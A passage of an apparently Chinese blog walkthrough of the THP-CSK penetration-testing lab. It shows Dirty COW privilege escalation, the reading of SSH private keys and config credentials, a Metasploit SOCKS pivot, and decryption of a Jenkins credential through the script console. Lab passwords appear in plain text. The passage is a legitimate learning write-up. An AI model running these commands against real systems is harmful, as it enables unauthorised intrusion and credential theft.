+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image26.png"></p>
+<p>同样失败，这台机器的内核版本就是不吃这套。</p>
+<hr>
+<h3 id="❌-Dirty-COW-40839（失败，机器崩了）"><a href="#❌-Dirty-COW-40839（失败，机器崩了）" class="headerlink" title="❌ Dirty COW 40839（失败，机器崩了）"></a>❌ Dirty COW 40839（失败，机器崩了）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit dirty cow</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image27.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m linux/local/40839.c</span><br><span class="line">sessions 1</span><br><span class="line">upload 40839.c /tmp/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image28.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">gcc 40839.c -o cow -lcrypt -lpthread</span><br><span class="line"><span class="built_in">chmod</span> +x cow</span><br><span class="line">./cow</span><br></pre></td></tr></table></figure>
+
+<p>输入密码 <code>123456</code> 后 <code>su firefart</code>……又崩了。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image29.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image30.png"></p>
+<hr>
+<h3 id="✅-Dirty-COW-40616（成功！）"><a href="#✅-Dirty-COW-40616（成功！）" class="headerlink" title="✅ Dirty COW 40616（成功！）"></a>✅ Dirty COW 40616（成功！）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m linux/local/40616.c</span><br><span class="line">upload 40616.c /tmp/</span><br><span class="line">shell</span><br><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">gcc 40616.c -o cowroot -pthread</span><br><span class="line"><span class="built_in">chmod</span> +x cowroot</span><br><span class="line">./cowroot</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image31.png"></p>
+<p>🎉 成功提权！</p>
+<p>执行完之后，建议立刻运行以下命令<strong>保持利用稳定</strong>，不然系统很容易随机崩掉：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/vm/dirty_writeback_centisecs</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/panic</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/panic_on_oops</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/panic_on_unrecovered_nmi</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/panic_on_io_nmi</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/panic_on_warn</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>⚠️ <strong>千万别一次性全部复制粘贴执行！</strong> 一条一条来，否则可能造成系统崩溃。</p>
+</blockquote>
+<p>关于把自己主机干蓝屏这件事……（doge）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image32.png"></p>
+<hr>
+<h2 id="🔎-内网信息收集"><a href="#🔎-内网信息收集" class="headerlink" title="🔎 内网信息收集"></a>🔎 内网信息收集</h2><p>提权成功后，先看看网卡信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image33.png"></p>
+<p>只有一个网段，确认网络拓扑。</p>
+<p>然后去翻一下应用配置文件，找数据库连接信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /opt/tomcat/webapps/kittens/WEB-INF/config/opencms.properties</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image34.png"></p>
+<p>找到了关键信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># WEB站点</span><br><span class="line">IP地址：172.16.250.10</span><br><span class="line">端口号：80</span><br><span class="line"></span><br><span class="line"># 数据库</span><br><span class="line">IP地址：172.16.250.50</span><br><span class="line">端口号：3306</span><br><span class="line"></span><br><span class="line"># 站库分离</span><br><span class="line">账号密码：store / WTWOIUEfjSLeij</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>📝 这就是典型的站库分离架构，Web 和数据库分别跑在不同机器上。</p>
+</blockquote>
+<p>翻一下历史命令，找到SSH 连接记录：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> ~/.bash_history</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image35.png"></p>
+<p>发现有 SSH 连接记录，再去读一下密钥：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image36.png"></p>
+<p>复制 SSH 私钥到本地（保存为 <code>ssh.txt</code>），尝试免密登录 .30 机器：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i ssh.txt root@172.16.250.30</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image37.png"></p>
+<p>✅ 成功登录 <code>.30</code> 机器！</p>
+<hr>
+<h2 id="🔀-横向移动到-30（Jenkins）"><a href="#🔀-横向移动到-30（Jenkins）" class="headerlink" title="🔀 横向移动到 .30（Jenkins）"></a>🔀 横向移动到 .30（Jenkins）</h2><p>进去之后发现有个用户叫 <code>jenkins</code>：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image38.png"></p>
+<p>合理怀疑这台机器跑了 Jenkins 服务。查一下本机监听的端口：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -tlnp</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>参数说明：<code>-t</code> TCP &#x2F; <code>-l</code> 监听中 &#x2F; <code>-n</code> 数字显示 &#x2F; <code>-p</code> 显示进程</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image39.png"></p>
+<p>果然有 <code>8080</code> 端口在监听，但之前 nmap 外部扫描没扫到，说明<strong>这个服务只对内网开放</strong>。</p>
+<p>直接从外部访问果然不行：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image40.png"></p>
+<p>在 <code>.10</code> 机器上试试：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://172.16.250.30:8080</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image41.png"></p>
+<p>有响应！那就在 <code>.10</code> 建立 SOCKS 代理节点，把流量代理过去。</p>
+<hr>
+<h2 id="🧭-建立-SOCKS-代理穿透内网"><a href="#🧭-建立-SOCKS-代理穿透内网" class="headerlink" title="🧭 建立 SOCKS 代理穿透内网"></a>🧭 建立 SOCKS 代理穿透内网</h2><p>退回 MSF session（<strong>不要 <code>ctrl+c</code> 或 <code>exit</code>，会话会直接中断！</strong> 用 <code>background</code>）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image42.png"></p>
+<h3 id="建立路由"><a href="#建立路由" class="headerlink" title="建立路由"></a>建立路由</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use multi/manage/autoroute</span><br><span class="line"><span class="built_in">set</span> session 4</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>让流量通过 <code>.10</code> 机器走。</p>
+<h3 id="建立-SOCKS-代理"><a href="#建立-SOCKS-代理" class="headerlink" title="建立 SOCKS 代理"></a>建立 SOCKS 代理</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line"><span class="built_in">set</span> SRVPORT 1080</span><br><span class="line"><span class="built_in">set</span> VERSION 4a</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>确认模块运行状态：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">jobs</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image43.png"></p>
+<h3 id="配置-proxychains"><a href="#配置-proxychains" class="headerlink" title="配置 proxychains"></a>配置 proxychains</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /etc/proxychains4.conf</span></span><br><span class="line">socks4 127.0.0.1 1080</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>尝试用 <code>proxychains firefox</code> 结果不好使，有限制，比较麻烦，直接改浏览器代理配置更省事。</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image44.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image45.png"></p>
+<p>可以正常访问了！</p>
+<blockquote>
+<p>💡 <strong>原理说明：</strong> 流量走 <code>127.0.0.1:1080</code>，MSF 监听到数据后通过 <code>.10</code> 节点转发给 <code>.30</code> 机器，实现外部访问内网服务。</p>
+</blockquote>
+<hr>
+<h3 id="让自己的电脑也能用这个代理"><a href="#让自己的电脑也能用这个代理" class="headerlink" title="让自己的电脑也能用这个代理"></a>让自己的电脑也能用这个代理</h3><p>如果想让本机（非 Kali）也通过这个节点访问内网，需要把监听地址从 <code>127.0.0.1</code> 改为 <code>0.0.0.0</code>（允许任意来源连接）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">jobs</span> -k 0   <span class="comment"># 先关掉之前那个</span></span><br><span class="line"></span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line"><span class="built_in">set</span> SRVHOST 0.0.0.0   <span class="comment"># 关键：允许任何机器连接你的 Kali</span></span><br><span class="line"><span class="built_in">set</span> SRVPORT 1080</span><br><span class="line"><span class="built_in">set</span> VERSION 4a</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><strong>方式一：浏览器插件（推荐）</strong></p>
+<p>配置 SOCKS4 代理指向 Kali IP:1080，启动就能访问了。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image46.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image47.png"></p>
+<p><strong>方式二：代理工具（Proxifier）</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image48.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image49.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image50.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image51.png"></p>
+<p>结果测试半天浏览器就是不走流量，试了半天才知道是软件问题</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260321150416364.png"></p>
+<blockquote>
+<p>⚠️ 注意：Proxifier <strong>Portable Edition（非安装版）不注入系统驱动</strong>，无法拦截任意进程的流量，Applications 写 <code>Any</code> 完全没用。所以这里用 Portable 版试了半天没反应，换回浏览器插件解决。</p>
+</blockquote>
+<p>也可以直接用 curl 测试通路：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --socks4 172.16.250.128:1080 http://172.16.250.30:8080/</span><br></pre></td></tr></table></figure>
+
+<p>有正常回显，通信没问题。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260321150507432.png"></p>
+<hr>
+<h2 id="🔑-Jenkins-凭据窃取"><a href="#🔑-Jenkins-凭据窃取" class="headerlink" title="🔑 Jenkins 凭据窃取"></a>🔑 Jenkins 凭据窃取</h2><p>继续访问 Jenkins：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.250.30:8080/jenkins/</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>💡 直接访问 <code>8080</code> 是 Tomcat，Jenkins 路径是 <code>/jenkins/</code>，用proxchains dirsearch还把msf扫崩了，翻wp才知道路径是&#x2F;jenkins&#x2F;……</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image54.png"></p>
+<p>点进去可以看到有两个凭据账户：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image55.png"></p>
+<p><strong>第一个：root 账户</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image56.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image57.png"></p>
+<p>就是之前从 <code>.10</code> 拿到的那个 SSH 私钥，对应 <code>.30</code> 的 root 登录。</p>
+<p><strong>第二个：db_backup 账户</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image58.png"></p>
+<p>密码前端是隐藏的，简单改改</p>
+<p>发现一段加密字符串：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2M0vgELkx9OMFTP8UCoNNneTI7CVjBr9sKSCtKoUl08=</span><br></pre></td></tr></table></figure>
+
+<p>这是数据库用户（<code>.50</code> 机器）的密码，明显加密了，需要解密。</p>
+<p>Jenkins 自带脚本控制台，可以直接解密：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image59.png"></p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">println hudson.util.Secret.decrypt(<span class="string">&quot;2M0vgELkx9OMFTP8UCoNNneTI7CVjBr9sKSCtKoUl08=&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image60.png"></p>
+<p>解密得到明文密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">)uDvra&#123;4UL^;r?*h</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>📌 Jenkins 使用 <code>hudson.util.Secret</code> 对凭据加密，密钥存储在 Jenkins 主目录的 <code>secret.key</code> 文件中，通过 Groovy 脚本可以直接在 Jenkins 内解密。这是 Jenkins 凭据审计中的常见利用点。</p>
+</blockquote>
+<hr>
+<h2 id="🎯-横向移动到-50（数据库服务器）"><a href="#🎯-横向移动到-50（数据库服务器）" class="headerlink" title="🎯 横向移动到 .50（数据库服务器）"></a>🎯 横向移动到 .50（数据库服务器）</h2><p>拿到密码，可以直接 SSH 连接 <code>.50</code> 的数据库备份账户：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh db_backup@172.16.250.50</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image61.png"></p>
+<p>看一下 sudo 权限：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br></pre></td></tr></table></figure>
+
+<p>惊喜，直接可以提权：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> su</span><br></pre></td></tr></table></figure>
+
+<p>✅ 成功获取 <code>.50</code> 数据库服务器的 root 权限！</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image62.png"></p>
+<hr>
+<h2 id="📊-完整攻击链回顾"><a href="#📊-完整攻击链回顾" class="headerlink" title="📊 完整攻击链回顾"></a>📊 完整攻击链回顾</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[kali外网]</span><br><span class="line">  │</span><br><span class="line">  ▼</span><br><span class="line">.10 (172.16.250.10)</span><br><span class="line">  ├─ Struts2 CVE-2017-5638 → RCE (tomcat权限)</span><br><span class="line">  ├─ DirtyCOW 40616 → root提权</span><br><span class="line">  ├─ 读取 opencms.properties → 发现数据库IP(.50)</span><br><span class="line">  └─ 读取 ~/.ssh/id_rsa → SSH私钥</span><br><span class="line">  │</span><br><span class="line">  ▼</span><br><span class="line">.30 (172.16.250.30)</span><br><span class="line">  ├─ SSH私钥免密登录 root</span><br><span class="line">  ├─ Jenkins 8080 仅内网开放</span><br><span class="line">  ├─ MSF autoroute + socks_proxy 穿透内网</span><br><span class="line">  └─ Jenkins 脚本控制台解密凭据</span><br><span class="line">  │</span><br><span class="line">  ▼</span><br><span class="line">.50 (172.16.250.50)</span><br><span class="line">  ├─ db_backup + 解密密码 SSH登录</span><br><span class="line">  └─ sudo su → root</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="💬-踩坑总结"><a href="#💬-踩坑总结" class="headerlink" title="💬 踩坑总结"></a>💬 踩坑总结</h2><p>这次靶场环境问题确实有点多，整理一下踩过的坑：</p>
+<ul>
+<li>🐛 <strong>浏览器经常崩</strong>，没错自己的浏览器打不开，不知道什么问题</li>
+<li>🐛 <strong>MSF session 掉线</strong>，msf的权限太容易掉了</li>
+<li>🐛 <strong>靶机不稳定</strong>，Dirty COW 打了好几次才成功，40839 和 Metasploit 模块都失败了，最后 40616 才行</li>
+<li>🐛 <strong>Proxifier Portable 无效</strong>，非安装版不注入驱动，<code>Any</code> 进程规则没用，直接改浏览器代理省事多了</li>
+<li>🐛 <strong>Jenkins 路径不直觉</strong>，直接访问 8080 是 Tomcat，Jenkins 藏在 <code>/jenkins/</code> 下，没 WP 真不好找</li>
+<li>🐛 <strong>proxychains + dirsearch 把 MSF 扫崩了</strong>……真的难崩（加参数-t）</li>
+<li>🐛 <strong>自己电脑还崩过一次</strong></li>
+</ul>
+<p>蚌埠住了，但最后全打通了，还是值得的 🎉</p>
+</article>
+<div class="article-footer">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+
+</div>
+
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/posts/3035988a/">代码审计 | FastJson 1.2.24 反序列化 RCE 漏洞分析</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/posts/55d71cb8/">工具魔改 | 魔改哥斯拉 - 反编译重打包与Webshell免杀对抗</a></div></section></div>
+
+
+
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"></div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%F0%9F%9B%A1%EF%B8%8F-THP-CSK-%E9%9D%B6%E5%9C%BA-%C2%B7-Linux-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E5%85%A8%E6%B5%81%E7%A8%8B"><span class="toc-text">🛡️ THP-CSK 靶场 · Linux 内网横向渗透全流程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%8B-%E9%9D%B6%E5%9C%BA%E6%A6%82%E8%BF%B0"><span class="toc-text">📋 靶场概述</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%97%BA%EF%B8%8F-%E6%95%B4%E4%BD%93%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF"><span class="toc-text">🗺️ 整体攻击思路</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%A5-%E9%9D%B6%E5%9C%BA%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="toc-text">📥 靶场文件下载</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%A7-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">🔧 环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%8D-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">🔍 信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%8C%90-Web-%E8%B8%A9%E7%82%B9"><span class="toc-text">🌐 Web 踩点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%92%A5-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AStruts2-RCE%EF%BC%88CVE-2017-5638%EF%BC%89"><span class="toc-text">💥 漏洞利用：Struts2 RCE（CVE-2017-5638）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%AC%86%EF%B8%8F-%E6%8F%90%E6%9D%83"><span class="toc-text">⬆️ 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%8E-%E6%8F%90%E6%9D%83%E4%BE%A6%E5%AF%9F"><span class="toc-text">🔎 提权侦察</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9D%8C-%E5%B0%9D%E8%AF%95-overlayfs%EF%BC%88%E5%A4%B1%E8%B4%A5%EF%BC%89"><span class="toc-text">❌ 尝试 overlayfs（失败）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9D%8C-Metasploit-overlayfs-%E6%A8%A1%E5%9D%97%EF%BC%88%E5%A4%B1%E8%B4%A5%EF%BC%89"><span class="toc-text">❌ Metasploit overlayfs 模块（失败）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9D%8C-Dirty-COW-40839%EF%BC%88%E5%A4%B1%E8%B4%A5%EF%BC%8C%E6%9C%BA%E5%99%A8%E5%B4%A9%E4%BA%86%EF%BC%89"><span class="toc-text">❌ Dirty COW 40839（失败，机器崩了）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-Dirty-COW-40616%EF%BC%88%E6%88%90%E5%8A%9F%EF%BC%81%EF%BC%89"><span class="toc-text">✅ Dirty COW 40616（成功！）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%8E-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">🔎 内网信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%80-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%B0-30%EF%BC%88Jenkins%EF%BC%89"><span class="toc-text">🔀 横向移动到 .30（Jenkins）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%AD-%E5%BB%BA%E7%AB%8B-SOCKS-%E4%BB%A3%E7%90%86%E7%A9%BF%E9%80%8F%E5%86%85%E7%BD%91"><span class="toc-text">🧭 建立 SOCKS 代理穿透内网</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BB%BA%E7%AB%8B%E8%B7%AF%E7%94%B1"><span class="toc-text">建立路由</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 